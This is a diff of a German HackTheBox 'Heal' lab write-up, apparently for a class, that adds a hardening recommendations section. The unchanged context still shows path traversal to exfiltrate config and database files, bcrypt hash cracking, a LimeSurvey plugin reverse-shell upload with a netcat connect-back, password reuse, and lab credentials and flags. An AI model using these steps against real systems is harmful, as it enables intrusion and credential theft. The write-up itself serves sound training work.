@@ -8,12 +8,13 @@ Als erstes haben wir uns mit HTB durch openvpn verbunden:
 
 ```bash
 sudo apt update
-                                                                       
+                                                                     
 sudo apt install openvpn -yd
 
 sudo openvpn Desktop/lab_lyfe691.ovpn
 
 ```
+
 Das war erfolgreich, wie man auf der HTB Website sehen kann:
 
 ![alt text](image.png)
@@ -59,6 +60,7 @@ Content-Length: 178
 Connection: keep-alive
 Location: http://heal.htb/
 ```
+
 Damit wir die Seite sehen konnten, mussten wir den Hostnamen lokal auflösen. Dazu bearbeiteten wir die Datei /etc/hosts und verwiesen heal.htb auf die IP-Adresse der Maschine.
 
 ```bash
@@ -113,6 +115,7 @@ Ich benutze curl um kurz zu sehen was es ergibt
 ```bash
 curl -i http://api.heal.htb/
 ```
+
 Die Antwort zeigte deutlich, dass die Seite von Ruby on Rails Version 7.1.4 betrieben wird. Beim Zugriff über Firefox wurde die standardmässige rails seite angezeigt.
 
 ![1744664202485](image/Dokumentation/1744664202485.png)
@@ -140,14 +143,14 @@ profile page:
 
 ![1744665820487](image/Dokumentation/1744665820487.png)
 
-survey page: 
+survey page:
 
 ![1744665981729](image/Dokumentation/1744665981729.png)
 
 ## Survey inspection
 
-Als wir auf der Survey Page über den Button «hoverten», wurde eine PHP Page und eine neue Subdomain (take-survey.heal.htb) angezeigt. Im Unterricht schauten wir es uns mit PHP an und wir dachten, dass wir XSS oder so ausprobieren könnten, doch das ging nicht. 
-  
+Als wir auf der Survey Page über den Button «hoverten», wurde eine PHP Page und eine neue Subdomain (take-survey.heal.htb) angezeigt. Im Unterricht schauten wir es uns mit PHP an und wir dachten, dass wir XSS oder so ausprobieren könnten, doch das ging nicht.
+
 ![alt text](indexphpsh.png)
 
 Wie immer, wenn wir eine Seite ansehen wollten, fügten wir den Eintrag in der Datei `/etc/hosts` hinzu.
@@ -164,16 +167,15 @@ added line:
 
 ![alt text](Screenshot_2025-04-18_20_53_22.png)
 
-
-so, jetzt können wir die survey page sehen: 
+so, jetzt können wir die survey page sehen:
 
 ![alt text](Screenshot_2025-04-18_21_05_21.png)
 
-wir haben das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`. 
+wir haben das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`.
 
 ![alt text](Screenshot_2025-04-19_15_13_54.png)
 
-Das sagt uns das es auch einen Admin login oder so geben sollte. Deswegen haben wir uns mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt: 
+Das sagt uns das es auch einen Admin login oder so geben sollte. Deswegen haben wir uns mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt:
 
 ![alt text](image-1.png)
 
@@ -181,16 +183,15 @@ wie man sehen kann hat es tatsächlich ein admin panel, aber da wir die login da
 
 ## Ralphs password
 
-
 Nachdem auf der Survey expired‑Seite die Adresse ralph@heal.htb aufgetaucht war, brauchten wir nur noch dessen Kennwort, um uns in das Admin‑Backend einzuloggen.
 
-
 #### 1. JWT‑Token abgreifen
+
 Beim Registrieren/Anmelden auf heal.htb wurde im network tab das jwt zurückgeliefert (unten rechts im bild).
 
 ![image with  in dev tools token: ey](image-3.png)
 
-also haben wir den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen: 
+also haben wir den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen:
 
 ```bash
 export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
@@ -222,6 +223,7 @@ x-runtime: 0.003895
 ```
 
 #### 2. Path‑Traversal verifizieren
+
 Um die benötigte Anzahl `../` zu bestimmen, haben wir einen Mini‑Loop gebaut:
 
 ```bash
@@ -242,7 +244,6 @@ Ergebnis - bei fünf Punkten erschien `/etc/passwd`, Tiefe 2 zeigte eine vorh
 [8] root:x:0:0:root:/root:/bin/bash
 [9] root:x:0:0:root:/root:/bin/bash
 ```
-
 
 #### 3. Rails‑Konfiguration exfiltrieren
 
@@ -281,6 +282,7 @@ production:
   <<: *default
   database: storage/development.sqlite3
 ```
+
 #### 4. SQLite‑DB herunterladen
 
 Wie man oben sehen kann ist die production datenbank unter `storage/development.sqlite3`, also haben wir sie heruntergeladen.
@@ -291,7 +293,8 @@ curl -s -H "Authorization: Bearer $TOKEN" \
      -o dev.sqlite3
 file dev.sqlite3          # SQLite 3.x database
 ```
-output: 
+
+output:
 
 ```
 dev.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
@@ -306,6 +309,7 @@ sqlite3 dev.sqlite3 \
 ```
 
 hashes.txt:
+
 ```txt
 ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
 test@htb.com|$2a$12$b/eb1KU/r9RfpyVRp2aBP.rDxE3p7.rRAjM8lCd0iLUnZh26VSpu.
@@ -316,18 +320,19 @@ admin@gmail.com|$2a$12$Xe.3wFV2bDQHgJ8Bx6zX.uRho9IqV9i1o5mYT8x/0N.DSdLX25.GO
 lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
 ```
 
-
 #### 6. Nur Ralphs Hash isolieren & cracken
 
-unser ziel ist nur ralphs pwd, also haben wir ihn isoliert und das pwd mit hashcat gecrackt:  
+unser ziel ist nur ralphs pwd, also haben wir ihn isoliert und das pwd mit hashcat gecrackt:
 
 ```bash
 grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
 ```
+
 ```bash
 # rockyou ggf. entpacken da ich es noch nicht entpackt hatte:
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 ```
+
 ```bash
 # show flag zeigt den output an
 hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt --show
@@ -354,7 +359,7 @@ konnten wir uns unter http://take‑survey.heal.htb/admin einloggen und erhielte
 
 ## Reverse Shell – www-data via LimeSurvey Plugin Upload
 
-Nachdem wir Zugriff auf das Admin panel von LimeSurvey hatten, haben wir nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit: 
+Nachdem wir Zugriff auf das Admin panel von LimeSurvey hatten, haben wir nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit:
 
 https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
 
@@ -381,7 +386,7 @@ system($payload);
 EOF
 ```
 
-PLugin Metadaten (config.xml): 
+PLugin Metadaten (config.xml):
 
 ```xml
 cat > config.xml <<'EOF'
@@ -409,7 +414,7 @@ cat > config.xml <<'EOF'
 EOF
 ```
 
-Zip archive erstellen damit wir es hochladen kann: 
+Zip archive erstellen damit wir es hochladen kann:
 
 ```bash
 zip lyfe691-exploit.zip php-rev.php config.xml
@@ -423,14 +428,13 @@ Im Web-Interface unter http://take‑survey.heal.htb/admin:
 
     Auf auf Upload & install gecklickt -> lyfe691-exploit.zip ausgewählt
 
-    Installieren: 
+    Installieren:
 
 ![alt text](Screenshot_2025-04-19_20_22_46.png)
 
-    Und dann noch aktivieren: 
+    Und dann noch aktivieren:
 
 ![alt text](Screenshot_2025-04-19_20_23_11.png)
-
 
 #### 3. Listener im terminal öffnen
 
@@ -448,6 +452,7 @@ Im Browser:
 connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 52792
 www-data@heal:/var/www/limesurvey$
 ```
+
 ![alt text](Screenshot_2025-04-19_20_30_08.png)
 
 Jetzt hatten wir eine voll funktionsfähige shell als www-data auf der Maschine.
@@ -479,10 +484,11 @@ fanden wir in der Datei config.php die Zugangsdaten für die PostgreSQL Datenban
 'username' => 'db_user',
 'password' => 'AdmiDi0_pA$$w0rd',
 
-Ganzer output: 
+Ganzer output:
+
 ```php
 www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ `cat /var/www/limesurvey/application/config/config.php`
-<t /var/www/limesurvey/application/config/config.php       
+<t /var/www/limesurvey/application/config/config.php     
 <?php if (!defined('BASEPATH')) exit('No direct script access allowed');
 /*
 | -------------------------------------------------------------------
@@ -563,17 +569,19 @@ return array(
 ```
 
 Da viele Systeme schwache Passwort policies und reuse verwenden, haben wir versucht, uns mit diesem Passwort als Benutzer ron einzuloggen.
+
 #### 3. su auf ron
+
 ```
 www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
-su ron                                                                                                                                                                                                                                      
-Password: AdmiDi0_pA$$w0rd                                                                                                                                                                                                                  
+su ron                                                                                                                                                                                                                                    
+Password: AdmiDi0_pA$$w0rd                                                                                                                                                                                                                
 shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
 ```
 
-War erfolgreich. 
+War erfolgreich.
 
-#### 4. User-Flag 
+#### 4. User-Flag
 
 Nach dem Wechsel in rons home dings:
 
@@ -601,12 +609,12 @@ d18da46a08d09ab95187edcc99ae1188
 
 ![alt text](Screenshot_2025-04-19_21_38_25.png)
 
-wie man sehen kann ist das userflag: 
+wie man sehen kann ist das userflag:
 
 `d18da46a08d09ab95187edcc99ae1188`
 
 ### HTB user flag owned:
- 
+
 ![alt text](Screenshot_2025-04-20_15_31_17.png)
 
 ## Root Flag
@@ -617,18 +625,18 @@ Nach dem Zugriff als Benutzer ron haben wir mit netstat überprüft, welche Port
 netstat -tulnp | grep LISTEN
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
-tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                 
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                 
 tcp6       0      0 :::22                   :::*                    LISTEN      -   
 ```
 
@@ -725,7 +733,7 @@ shell popt, root zugriff bestätigt
 
 #### Root Flag lesen
 
-als erstes die directories/files listen: 
+als erstes die directories/files listen:
 
 ```
 root@heal:/# ls -la  
@@ -757,9 +765,10 @@ drwxrwxrwt  14 root root  4096 Apr 20 18:48 tmp
 drwxr-xr-x  14 root root  4096 Dec  8 13:57 usr
 drwxr-xr-x  13 root root  4096 Dec  8 13:57 var
 ```
+
 Beim dutchstöbern haben wir folgendes file gefunden: `root.txt`.
 
-Jetzt mussten wir es nur noch lesen: 
+Jetzt mussten wir es nur noch lesen:
 
 ```
 root@heal:/# cat /root/root.txt
@@ -771,7 +780,7 @@ wie man sehen kann ist das root flag: `7abbed710c05c4d217992b4d3efc3721`
 
 ![alt text](Screenshot_2025-04-20_15_24_38.png)
 
-###  HTB Root Flag owned: 
+### HTB Root Flag owned:
 
 ![alt text](Screenshot_2025-04-20_15_32_57.png)
 
@@ -782,3 +791,44 @@ wie man sehen kann ist das root flag: `7abbed710c05c4d217992b4d3efc3721`
 
 ![alt text](Screenshot_2025-04-20_15_32_08.png)
 
+
+## Empfehlungen & Geeignete Gegenmassnahmen
+1. **Input Validierung & sichere API-Endpunkte**
+
+   - Die Webanwendung litt unter Directory Traversal aufgrund fehlender Validierung im download?filename=... Parameter.
+   → **Massnahme:** Strikte Validierung erlaubter Pfade, Nutzung von Whitelists und serverseitige Canonicalisierung.
+
+2. **JWT-Schutz verbessern**
+
+   - Die JWT-Tokens waren leicht abfangbar und dauerhaft gültig.
+   → **Massnahme:** JWT mit kurzem Ablaufdatum und Rotation verwenden, zusätzlich Tokens über HTTPS transportieren.
+
+3. **Datenbankzugänge absichern**
+
+   - Die Rails-Datenbank war über Path Traversal erreichbar, und sensible Dateien wie database.yml konnten exfiltriert werden.
+   → **Massnahme:** Produktionsdatenbanken nicht im Webroot ablegen und Dateisystem-Zugriffsrechte hart absichern.
+
+4. **Hash-Sicherheit**
+
+   - Benutzerpasswörter waren in einer SQLite-Datei abgelegt, ohne zusätzlichen Schutz.
+   → **Massnahme:** Salted Hashes mit starken Algorithmen (z. B. Argon2) und Datei-Zugriff nur für autorisierte Benutzer.
+
+5. **Admin Panel absichern**
+
+   - Das Admin-Interface war öffentlich erreichbar und durch Passwort-Wiederverwendung angreifbar.
+   → **Massnahme:** Admin-Zugang auf bestimmte IP-Ranges beschränken, Zwei-Faktor-Authentifizierung einführen.
+
+6. **LimeSurvey RCE über Plugin-Upload**
+
+   - Die eingesetzte Version war verwundbar gegenüber Remote Code Execution durch Plugin-Upload.
+   → **Massnahme:** Regelmässige Updates aller Drittanbieter-Software, speziell CMS/Survey-Systeme.
+
+7. **SSH- und Benutzer-Passwortpolitik**
+
+   - Das Datenbankpasswort AdmiDi0_pA$$w0rd wurde auch für das Systemkonto ron verwendet.
+   → **Massnahme:** Trennung von Web/DB-Passwörtern und starke Passwortpolicy mit Rotation.
+
+8. **Lokale Dienste wie Consul absichern**
+
+   - Der Consul-Dienst auf Port 8500 konnte durch lokalen Zugriff und API-Manipulation zu Root-RCE führen.
+   → **Massnahme:** Dienste wie Consul nur mit Authentifizierung betreiben und per Firewall absichern (z. B. localhost‑Binding, ACLs, Tokens).
